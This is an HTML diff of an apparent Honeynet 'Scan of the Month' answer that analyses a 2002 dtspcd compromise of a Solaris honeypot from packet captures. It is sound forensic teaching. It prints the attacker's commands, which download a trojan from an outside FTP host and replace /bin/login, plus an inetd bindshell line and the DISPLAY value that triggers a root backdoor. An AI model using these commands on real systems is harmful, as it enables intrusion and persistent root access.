@@ -1,0 +1,255 @@
+<HTML>
+<BODY>
+The Challenge:
+On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc was remotely compromised with the dtspcd exploit. 
+What makes this attack interesting is that this is the first time the attack was identified and captured in the wild, resulting a CERT advisory. 
+Using the Snort binary capture of the attack, answer the following questions. The honeypot that is attacked is 172.16.1.102. 
+
+
+
+612be364f54ca5fcb47cf70e69419175 
+
+wait3r@blip[~/scan20]$ -> md5sum 0108\@000-snort.log.tar.gz
+612be364f54ca5fcb47cf70e69419175  0108@000-snort.log.tar.gz
+
+
+Questions..
+-----------
+
+1. What is a NOP slide, and how is this one different from the NOP slide in the rpc.statd exploit in Scan10? 
+2. The attack was on 08 Jan, 2002. Would Snort have generated an alert then for the attack? 
+3. In the exploit code, the command "/bin/sh sh -i" is given, what is its purpose, and why is 'sh' shown twice? 
+4. The attacker executed a variety of commands on the hacked Solaris box. 
+   Which commands were automated by the exploit, which commands were manual by the attacker himself? 
+5. What is sun1, and how does it work? 
+6. What did you learn from this exercise? 
+7. How long did this challenge take you? 
+
+Answers..
+---------
+
+1. If I understand the question correctly, a NOP slide is just the reference to a set of 'NO OPeration' intructions in the shellcode. 
+   These are used to pad out the buffer before the shellcode. So, for example, if you have an overflow which occours at 256 bytes, but your 
+   shellcode is only 117bytes, you can pad the remaining 139bytes with NOP codes. The NOP's in this exploit differ from the ones in scan10 [1] 
+   (the rpc.statd compromise) because of the different architecures. A common i386 NOP code is "\x90" and the Sparc NOP code that was used 
+   in this example is "\x80\x1c\x40\x11".
+
+2. Snort may/will have picked up the NOP's, but only with a general rule. There was not a public CDE Snort rule until Chris Green composed one 
+   on the 14th of January, 2002 [2]. Six days after the compromise on the honeypot which occured on th 8th of January.
+
+3. 'sh' is given twice so that the attacker is given a "#" prompt when connecting to the bindshell, in this case port 1524/tcp. This provides 
+   easy detection for an automated tool to check that the attack has resulted in a sucessful compromise. 
+
+4. 
+
+For this part of the exercise I have chosen to use Jeremy Elsons tcpflow [3]
+
+wait3r@blip[~/scan20/tcpflow]$ -> tcpflow -r ../0108\@000-snort.log
+
+Extract any tcp traffic from the supplied snort log.
+Then check what kind of information it has managed to salvage using file. 
+The filename format (incase you haven't noticed), is:
+
+"source ip"."source port" - "destination ip"."destination port"
+
+wait3r@blip[~/scan20/tcpflow]$ -> file *
+064.224.118.115.00020-172.016.001.102.33514: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, stripped
+064.224.118.115.00021-172.016.001.102.33511: ASCII English text, with CRLF line terminators
+066.156.236.056.04065-172.016.001.102.00023: MP3,  32 kBits, 32 kHz, Mono
+172.016.001.102.00021-195.174.097.101.01876: ASCII text, with CRLF line terminators
+172.016.001.102.00023-066.156.236.056.04065: MP2,  32 kBits, 32 kHz, Mono
+172.016.001.102.01524-208.061.001.160.03596: ASCII text
+172.016.001.102.06112-208.061.001.160.03590: data
+172.016.001.102.33511-064.224.118.115.00021: ASCII text, with CRLF line terminators
+172.016.001.105.00021-195.174.097.101.01879: ASCII text, with CRLF line terminators
+172.016.001.108.00021-195.174.097.101.01884: ASCII text, with CRLF line terminators
+195.174.097.101.01876-172.016.001.102.00021: ASCII text, with CRLF line terminators
+195.174.097.101.01879-172.016.001.105.00021: ASCII text, with CRLF line terminators
+195.174.097.101.01884-172.016.001.108.00021: ASCII text, with CRLF line terminators
+208.061.001.160.03590-172.016.001.102.06112: data
+208.061.001.160.03592-172.016.001.102.06112: data
+208.061.001.160.03593-172.016.001.102.06112: data
+208.061.001.160.03594-172.016.001.102.06112: data
+208.061.001.160.03595-172.016.001.102.06112: data
+208.061.001.160.03596-172.016.001.102.01524: ASCII text
+
+Being that the bindshell is on port 1524, know exactly which stream has the commands are in:
+
+wait3r@blip[~/scan20/tcpflow]$ -> more 208.061.001.160.03596-172.016.001.102.01524
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+w
+unset HISTFILE
+cd /tmp
+mkdir /usr/lib
+mv /bin/login /usr/lib/libfl.k
+ftp 64.224.118.115
+ftp
+a@
+cd pub
+binary
+get sun1
+bye
+
+ls
+chmod 555 sun1
+mv sun1 /bin/login
+wait3r@blip[~/scan20/tcpflow]$ ->
+
+I initally thought that the following line was simply copy and pasted into the bindshell rather than being automated, but looking at the timestamps via tcpdump:
+15:46:18.215738 208.61.1.160.3595 > 172.16.1.102.6112: . ack 2 win 16060 <nop,nop,timestamp 463988080 4160189> (DF)
+15:46:18.239726 208.61.1.160.3596 > 172.16.1.102.ingreslock: S 4294410276:4294410276(0) win 16060 <mss 1460,sackOK,timestamp 463988080 0,nop,wscale 0> (DF)
+
+The first line is the final attack, and the second is the initial SYN to the bindshell on tcp/1524. There is too small a timeframe inbetween for it not 
+to be automated. The following line is the commands issued.
+
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+
+For Arin information on 218.7.3.19, see appendix 5.
+
+The manual commands, start with the 'w', checking to see if anyone was logged in. The attacker then proceeded obtain his file, "sun1", from the 
+anonymous ftp server on 64.224.118.115 [4].
+ 
+5. As we can see from the above captured commands, the attacker transfers 'sun1' in binary mode. From our initial tcpflow output we can see that 
+   the file:
+
+"064.224.118.115.00020-172.016.001.102.33514" is the Solaris/Sparc binary of 'sun1'. This is also confirmed by the source port being 20/tcp.
+
+wait3r@blip[~/scan20/tcpflow]$ -> cp 064.224.118.115.00020-172.016.001.102.33514 sun1
+wait3r@blip[~/scan20/tcpflow]$ -> strings sun1|head -10
+" H@
+$#<@
+/ @@
+# @@
+DISPLAY
+/usr/lib/libfl.k
+pirc
+/bin/sh
+lError 0
+Not owner
+.... extra lines removed.
+
+
+It is of course a trojaned /bin/login wrapper - same idea as bj.c [5] except using the DISPLAY enviroment variable instead of TERM. It is more 
+likely to be the other public login wrapper ulogin.c by Tragedy from etC! [6].
+It also looks fairly simple. We can check this like so:
+
+
+# uname -rs
+SunOS 5.8
+# mv /bin/login /bin/login.bak
+# ls -l sun1
+-rwx------   1 root  other       89776 Apr 15 11:30 sun1
+# mv sun1 /bin/login;chmod 4555 /bin/login
+# DISPLAY=pairc;export DISPLAY
+# telnet 0
+Trying 0.0.0.0...
+Connected to 0.
+Escape character is '^]'.
+
+SunOS 5.8
+
+# whoami
+root
+#
+
+There we have it, if your DISPLAY is equal to 'pirc' you get dropped at a root prompt. From the binary (and the commands from the bindshell) we 
+can tell that the original /bin/login binary is moved to: "/usr/lib/libfl.k". We can also test this by doing: 
+
+# cat >/usr/lib/libfl.k
+#!/bin/sh
+echo ".. /usr/lib/libfl.k has been called."
+^D
+#
+
+This time we unset out DISPLAY env because we do not want to trigger the trojan:
+
+# unset DISPLAY
+# telnet 0 
+Trying 0.0.0.0...
+Connected to 0.
+Escape character is '^]'.
+
+SunOS 5.8
+
+.. /usr/lib/libfl.k has been called.
+
+Connection closed by foreign host.
+
+As thought, if the DISPLAY env isn't set to pirc the trojaned wrapper will call /usr/lib/libfl.k.
+
+6. This is a classic example of why honeypots are useful to the security community.
+7. The exercise took me probably a couple of hours on and off for research, then an hour and a half for writing it up.
+
+Bonus Question:
+---------------
+One of the commands executed during the attack is:
+
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+
+
+This shows the attacker what the process id that their bindshell is running from. On a sucessful root compromise the exploit runs:
+/bin/ksh    -c  echo "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x 
+
+This is shown in the capture files:
+wait3r@blip[~/scan20/tcpflow]$ -> grep "/tmp/x " *
+Binary file 208.061.001.160.03592-172.016.001.102.06112 matches
+Binary file 208.061.001.160.03593-172.016.001.102.06112 matches
+Binary file 208.061.001.160.03594-172.016.001.102.06112 matches
+Binary file 208.061.001.160.03595-172.016.001.102.06112 matches
+
+A bindshell is created so they can connect to ingreslock (port 1524/tcp) and have an interactive shell. 'BD' I would assume, stands for backdoor.
+
+
+
+Appendix:
+
+[1]. http://project.honeynet.org/scans/scan10/
+[2]. http://marc.theaimsgroup.com/?l=snort-sigs&m=101104548924487&w=2
+[3]. http://www.circlemud.org/pub/jelson/tcpflow/
+[4]. Information from arin.net about the IP address:
+
+Interland (NETBLK-INTERLAND-5)
+101 Marietta St. Suite 400
+Atlanta, Ga 30303
+US
+
+Netname: INTERLAND-5
+Netblock: 64.224.0.0 - 64.227.255.255
+Maintainer: INTD
+
+Coordinator:
+	Wright, Barry  (BW995-ARIN)  asnadmin@interland.com
+	(404) 720 - 8301 ext. 5841
+   
+[5]. Information  from arin.net about the IP address:
+
+inetnum:     218.7.3.16 - 218.7.3.31
+netname:     HARBIN-MEDICAL-UNIVERSITY-1
+descr:       Harbin medical university
+country:     CN
+admin-c:     CX58-AP
+tech-c:      CX58-AP
+mnt-by:      MAINT-CHINANET-HL
+changed:     chexs@public.hr.hl.cn 20010607
+source:      APNIC
+
+person:      CHE XUESONG
+address:     HEILONGJIANG Province liu chuansen
+country:     CN
+phone:       +86-0451-5630553
+fax-no:      +86-0451-5630553
+e-mail:      chexs@public.hr.hl.cn
+nic-hdl:     CX58-AP
+mnt-by:      MAINT-CHINANET-HL
+changed:     chexs@public.hr.hl.cn 20000804
+source:      APNIC
+
+
+
+[5]. bj.c: http://project.honeynet.org/papers/forensics/bj.txt
+[6]. http://packetstorm.widexs.nl/UNIX/penetration/rootkits/ulogin.c
+
+
+
+</BODY>
+</HTML>
